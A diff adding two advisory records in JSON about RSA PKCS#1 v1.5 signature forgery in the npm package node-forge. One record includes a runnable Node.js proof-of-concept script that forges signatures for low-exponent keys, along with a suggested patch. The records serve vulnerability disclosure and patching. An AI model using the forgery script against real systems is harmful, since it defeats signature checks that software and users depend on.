@@ -1,0 +1,177 @@
+[
+ {
+  "schema_version": "1.9.0",
+  "id": "GHSA-86w9-cpqp-85rv",
+  "published": "2026-09-03T21:31:15Z",
+  "modified": "2026-10-01T21:40:55.016251436Z",
+  "aliases": [
+   "CVE-2026-33894",
+   "CVE-2026-85393",
+   "GHSA-ppp5-5v6c-4jwp"
+  ],
+  "summary": "node-forge RSA PKCS#1 v1.5 signature verification accepts extra nested DigestAlgorithm elements",
+  "details": "node-forge through 1.4.0 fails to validate element count in nested DigestAlgorithm sequences during RSA PKCS#1 v1.5 signature verification. Attackers can embed garbage bytes inside the DigestAlgorithm sequence to forge valid signatures for arbitrary messages using low-exponent RSA keys. This is an incomplete fix for CVE-2026-33894.",
+  "affected": [
+   {
+    "package": {
+     "name": "node-forge",
+     "ecosystem": "npm",
+     "purl": "pkg:npm/node-forge"
+    },
+    "ranges": [
+     {
+      "type": "SEMVER",
+      "events": [
+       {
+        "introduced": "0"
+       },
+       {
+        "last_affected": "1.4.0"
+       }
+      ]
+     }
+    ],
+    "database_specific": {
+     "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-86w9-cpqp-85rv/GHSA-86w9-cpqp-85rv.json"
+    }
+   }
+  ],
+  "references": [
+   {
+    "type": "ADVISORY",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85393"
+   },
+   {
+    "type": "WEB",
+    "url": "https://github.com/digitalbazaar/forge/issues/1149"
+   },
+   {
+    "type": "WEB",
+    "url": "https://github.com/digitalbazaar/forge/pull/1152"
+   },
+   {
+    "type": "ADVISORY",
+    "url": "https://github.com/advisories/GHSA-ppp5-5v6c-4jwp"
+   },
+   {
+    "type": "PACKAGE",
+    "url": "https://github.com/digitalbazaar/forge"
+   },
+   {
+    "type": "WEB",
+    "url": "https://github.com/digitalbazaar/forge/blob/v1.4.0/lib/asn1.js"
+   },
+   {
+    "type": "WEB",
+    "url": "https://github.com/digitalbazaar/forge/blob/v1.4.0/lib/rsa.js"
+   },
+   {
+    "type": "WEB",
+    "url": "https://www.vulncheck.com/advisories/node-forge-through-1.4.0-rsa-pkcs-1-1.5-signature-forgery-via-nested-digestalgorithm-padding"
+   }
+  ],
+  "database_specific": {
+   "cwe_ids": [
+    "CWE-347"
+   ],
+   "github_reviewed": true,
+   "github_reviewed_at": "2026-10-01T21:09:09Z",
+   "nvd_published_at": "2026-09-03T19:17:31Z",
+   "severity": "HIGH"
+  },
+  "severity": [
+   {
+    "type": "CVSS_V3",
+    "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+   },
+   {
+    "type": "CVSS_V4",
+    "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+   }
+  ]
+ },
+ {
+  "schema_version": "1.9.0",
+  "id": "GHSA-ppp5-5v6c-4jwp",
+  "published": "2026-03-26T22:02:35Z",
+  "modified": "2026-10-01T21:40:55.016251436Z",
+  "aliases": [
+   "CVE-2026-33894",
+   "CVE-2026-85393",
+   "GHSA-86w9-cpqp-85rv"
+  ],
+  "summary": "Forge has signature forgery in RSA-PKCS due to ASN.1 extra field  ",
+  "details": "## Summary\nRSASSA PKCS#1 v1.5 signature verification accepts forged signatures for low public exponent keys (e=3). Attackers can forge signatures by stuffing \u201cgarbage\u201d bytes within the ASN structure in order to construct a signature that passes verification, enabling [Bleichenbacher style forgery](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/). This issue is similar to [CVE-2022-24771](https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765), but adds bytes in an addition field within the ASN structure, rather than outside of it. \n\nAdditionally, forge does not validate that signatures include a minimum of 8 bytes of padding as [defined by the specification](https://datatracker.ietf.org/doc/html/rfc2313#section-8), providing attackers additional space to construct Bleichenbacher forgeries. \n\n## Impacted Deployments\n**Tested commit:** `8e1d527fe8ec2670499068db783172d4fb9012e5`\n**Affected versions:** tested on v1.3.3 (latest release) and recent prior versions.\n\n**Configuration assumptions:**\n- Invoke key.verify with defaults (default `scheme` uses RSASSA-PKCS1-v1_5).\n- `_parseAllDigestBytes: true` (default setting).\n\n## Root Cause\n\nIn `lib/rsa.js`, `key.verify(...)`, forge decrypts the signature block, decodes PKCS#1 v1.5 padding (`_decodePkcs1_v1_5`), parses ASN.1, and compares `capture.digest` to the provided digest.\n\nTwo issues are present with this logic:\n\n1. Strict DER byte-consumption (`_parseAllDigestBytes`) only guarantees all bytes are parsed, not that the parsed structure is the canonical minimal DigestInfo shape expected by RFC 8017 verification semantics. A forged EM with attacker-controlled additional ASN.1 content inside the parsed container can still pass forge verification while OpenSSL rejects it.\n2. `_decodePkcs1_v1_5` comments mention that PS < 8 bytes should be rejected, but does not implement this logic.\n\n## Reproduction Steps\n1. Use Node.js (tested with `v24.9.0`) and clone `digitalbazaar/forge` at commit `8e1d527fe8ec2670499068db783172d4fb9012e5`.\n4. Place and run the PoC script (`repro_min.js`) with `node repro_min.js` in the same level as the `forge` folder.\n5. The script generates a fresh RSA keypair (`4096` bits, `e=3`), creates a normal control signature, then computes a forged candidate using cube-root interval construction.\n6. The script verifies both signatures with:\n  - forge verify (`_parseAllDigestBytes: true`), and\n  - Node/OpenSSL verify (`crypto.verify` with `RSA_PKCS1_PADDING`).\n7. Confirm output includes:\n  - `control-forge-strict: true`\n  - `control-node: true`\n  - `forgery (forge library, strict): true`\n  - `forgery (node/OpenSSL): false`\n\n## Proof of Concept\n\n**Overview:**\n- Demonstrates a valid control signature and a forged signature in one run.\n- Uses strict forge parsing mode explicitly (`_parseAllDigestBytes: true`, also forge default).\n- Uses Node/OpenSSL as an differential verification baseline.\n- Observed output on tested commit:\n\n```text\ncontrol-forge-strict: true\ncontrol-node: true\nforgery (forge library, strict): true\nforgery (node/OpenSSL): false\n```\n\n<details><summary>repro_min.js</summary>\n\n```javascript\n#!/usr/bin/env node\n'use strict';\n\nconst crypto = require('crypto');\nconst forge = require('./forge/lib/index');\n\n// DER prefix for PKCS#1 v1.5 SHA-256 DigestInfo, without the digest bytes:\n// SEQUENCE {\n//   SEQUENCE { OID sha256, NULL },\n//   OCTET STRING <32-byte digest>\n// }\n// Hex: 30 0d 06 09 60 86 48 01 65 03 04 02 01 05 00 04 20\nconst DIGESTINFO_SHA256_PREFIX = Buffer.from(\n  '300d060960864801650304020105000420',\n  'hex'\n);\n\nconst toBig = b => BigInt('0x' + (b.toString('hex') || '0'));\nfunction toBuf(n, len) {\n  let h = n.toString(16);\n  if (h.length % 2) h = '0' + h;\n  const b = Buffer.from(h, 'hex');\n  return b.length < len ? Buffer.concat([Buffer.alloc(len - b.length), b]) : b;\n}\nfunction cbrtFloor(n) {\n  let lo = 0n;\n  let hi = 1n;\n  while (hi * hi * hi <= n) hi <<= 1n;\n  while (lo + 1n < hi) {\n    const mid = (lo + hi) >> 1n;\n    if (mid * mid * mid <= n) lo = mid;\n    else hi = mid;\n  }\n  return lo;\n}\nconst cbrtCeil = n => {\n  const f = cbrtFloor(n);\n  return f * f * f === n ? f : f + 1n;\n};\nfunction derLen(len) {\n  if (len < 0x80) return Buffer.from([len]);\n  if (len <= 0xff) return Buffer.from([0x81, len]);\n  return Buffer.from([0x82, (len >> 8) & 0xff, len & 0xff]);\n}\n\nfunction forgeStrictVerify(publicPem, msg, sig) {\n  const key = forge.pki.publicKeyFromPem(publicPem);\n  const md = forge.md.sha256.create();\n  md.update(msg.toString('utf8'), 'utf8');\n  try {\n    // verify(digestBytes, signatureBytes, scheme, options):\n    // - digestBytes: raw SHA-256 digest bytes for `msg`\n    // - signatureBytes: binary-string representation of the candidate signature\n    // - scheme: undefined => default RSASSA-PKCS1-v1_5\n    // - options._parseAllDigestBytes: require DER parser to consume all bytes\n    //   (this is forge's default for verify; set explicitly here for clarity)\n    return { ok: key.verify(md.digest().getBytes(), sig.toString('binary'), undefined, { _parseAllDigestBytes: true }) };\n  } catch (err) {\n    return { ok: false, err: err.message };\n  }\n}\n\nfunction main() {\n  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {\n    modulusLength: 4096,\n    publicExponent: 3,\n    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },\n    publicKeyEncoding: { type: 'pkcs1', format: 'pem' }\n  });\n\n  const jwk = crypto.createPublicKey(publicKey).export({ format: 'jwk' });\n  const nBytes = Buffer.from(jwk.n, 'base64url');\n  const n = toBig(nBytes);\n  const e = toBig(Buffer.from(jwk.e, 'base64url'));\n  if (e !== 3n) throw new Error('expected e=3');\n\n  const msg = Buffer.from('forged-message-0', 'utf8');\n  const digest = crypto.createHash('sha256').update(msg).digest();\n  const algAndDigest = Buffer.concat([DIGESTINFO_SHA256_PREFIX, digest]);\n\n  // Minimal prefix that forge currently accepts: 00 01 00 + DigestInfo + extra OCTET STRING.\n  const k = nBytes.length;\n  // ffCount can be set to any value at or below 111 and produce a valid signature.\n  // ffCount should be rejected for values below 8, since that would constitute a malformed PKCS1 package.\n  // However, current versions of node forge do not check for this.\n  // Rejection of packages with less than 8 bytes of padding is bad but does not constitute a vulnerability by itself.\n  const ffCount = 0; \n  // `garbageLen` affects DER length field sizes, which in turn affect how\n  // many bytes remain for garbage. Iterate to a fixed point so total EM size is exactly `k`.\n  // A small cap (8) is enough here: DER length-size transitions are discrete\n  // and few (<128, <=255, <=65535, ...), so this stabilizes quickly.\n  let garbageLen = 0;\n  for (let i = 0; i < 8; i += 1) {\n    const gLenEnc = derLen(garbageLen).length;\n    const seqLen = algAndDigest.length + 1 + gLenEnc + garbageLen;\n    const seqLenEnc = derLen(seqLen).length;\n    const fixed = 2 + ffCount + 1 + 1 + seqLenEnc + algAndDigest.length + 1 + gLenEnc;\n    const next = k - fixed;\n    if (next === garbageLen) break;\n    garbageLen = next;\n  }\n  const seqLen = algAndDigest.length + 1 + derLen(garbageLen).length + garbageLen;\n  const prefix = Buffer.concat([\n    Buffer.from([0x00, 0x01]),\n    Buffer.alloc(ffCount, 0xff),\n    Buffer.from([0x00]),\n    Buffer.from([0x30]), derLen(seqLen),\n    algAndDigest,\n    Buffer.from([0x04]), derLen(garbageLen)\n  ]);\n\n  // Build the numeric interval of all EM values that start with `prefix`:\n  // - `low`  = prefix || 00..00\n  // - `high` = one past (prefix || ff..ff)\n  // Then find `s` such that s^3 is inside [low, high), so EM has our prefix.\n  const suffixLen = k - prefix.length;\n  const low = toBig(Buffer.concat([prefix, Buffer.alloc(suffixLen)]));\n  const high = low + (1n << BigInt(8 * suffixLen));\n  const s = cbrtCeil(low);\n  if (s > cbrtFloor(high - 1n) || s >= n) throw new Error('no candidate in interval');\n\n  const sig = toBuf(s, k);\n\n  const controlMsg = Buffer.from('control-message', 'utf8');\n  const controlSig = crypto.sign('sha256', controlMsg, {\n    key: privateKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING\n  });\n\n  // forge verification calls (library under test)\n  const controlForge = forgeStrictVerify(publicKey, controlMsg, controlSig);\n  const forgedForge = forgeStrictVerify(publicKey, msg, sig);\n\n  // Node.js verification calls (OpenSSL-backed reference behavior)\n  const controlNode = crypto.verify('sha256', controlMsg, {\n    key: publicKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING\n  }, controlSig);\n  const forgedNode = crypto.verify('sha256', msg, {\n    key: publicKey,\n    padding: crypto.constants.RSA_PKCS1_PADDING\n  }, sig);\n\n  console.log('control-forge-strict:', controlForge.ok, controlForge.err || '');\n  console.log('control-node:', controlNode);\n  console.log('forgery (forge library, strict):', forgedForge.ok, forgedForge.err || '');\n  console.log('forgery (node/OpenSSL):', forgedNode);\n}\n\nmain();\n```\n</details>\n\n## Suggested Patch\n- Enforce PKCS#1 v1.5 BT=0x01 minimum padding length (`PS >= 8`) in `_decodePkcs1_v1_5` before accepting the block.\n- Update the RSASSA-PKCS1-v1_5 verifier to require canonical DigestInfo structure only (no extra attacker-controlled ASN.1 content beyond expected fields).\n\nHere is a Forge-tested patch to resolve the issue, though it should be verified for consumer projects:\n\n```diff\nindex b207a63..ec8a9c1 100644\n--- a/lib/rsa.js\n+++ b/lib/rsa.js\n@@ -1171,6 +1171,14 @@ pki.setRsaPublicKey = pki.rsa.setPublicKey = function(n, e) {\n             error.errors = errors;\n             throw error;\n           }\n+\n+          if(obj.value.length != 2) {\n+            var error = new Error(\n+              'DigestInfo ASN.1 object must contain exactly 2 fields for ' +\n+              'a valid RSASSA-PKCS1-v1_5 package.');\n+            error.errors = errors;\n+            throw error;\n+          }\n           // check hash algorithm identifier\n           // see PKCS1-v1-5DigestAlgorithms in RFC 8017\n           // FIXME: add support to validator for strict value choices\n@@ -1673,6 +1681,10 @@ function _decodePkcs1_v1_5(em, key, pub, ml) {\n       }\n       ++padNum;\n     }\n+\n+    if (padNum < 8) {\n+      throw new Error('Encryption block is invalid.');\n+    }\n   } else if(bt === 0x02) {\n     // look for 0x00 byte\n     padNum = 0;\n```\n## Resources\n- RFC 2313 (PKCS v1.5): https://datatracker.ietf.org/doc/html/rfc2313#section-8\n  - > This limitation guarantees that the length of the padding string PS is at least eight octets, which is a security condition. \n- RFC 8017: https://www.rfc-editor.org/rfc/rfc8017.html\n- `lib/rsa.js` `key.verify(...)` at lines ~1139-1223.\n- `lib/rsa.js` `_decodePkcs1_v1_5(...)` at lines ~1632-1695.\n\n## Credit\n\nThis vulnerability was discovered as part of a U.C. Berkeley security research project by: Austin Chu, Sohee Kim, and Corban Villa.",
+  "affected": [
+   {
+    "package": {
+     "name": "node-forge",
+     "ecosystem": "npm",
+     "purl": "pkg:npm/node-forge"
+    },
+    "ranges": [
+     {
+      "type": "SEMVER",
+      "events": [
+       {
+        "introduced": "0"
+       },
+       {
+        "fixed": "1.4.0"
+       }
+      ]
+     }
+    ],
+    "database_specific": {
+     "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-ppp5-5v6c-4jwp/GHSA-ppp5-5v6c-4jwp.json"
+    }
+   }
+  ],
+  "references": [
+   {
+    "type": "WEB",
+    "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765"
+   },
+   {
+    "type": "WEB",
+    "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwp"
+   },
+   {
+    "type": "ADVISORY",
+    "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33894"
+   },
+   {
+    "type": "WEB",
+    "url": "https://datatracker.ietf.org/doc/html/rfc2313#section-8"
+   },
+   {
+    "type": "PACKAGE",
+    "url": "https://github.com/digitalbazaar/forge"
+   },
+   {
+    "type": "WEB",
+    "url": "https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE"
+   },
+   {
+    "type": "WEB",
+    "url": "https://www.rfc-editor.org/rfc/rfc8017.html"
+   }
+  ],
+  "database_specific": {
+   "cwe_ids": [
+    "CWE-20",
+    "CWE-347"
+   ],
+   "github_reviewed": true,
+   "github_reviewed_at": "2026-03-26T22:02:35Z",
+   "nvd_published_at": "2026-03-27T21:17:25Z",
+   "severity": "HIGH"
+  },
+  "severity": [
+   {
+    "type": "CVSS_V3",
+    "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+   }
+  ]
+ }
+]
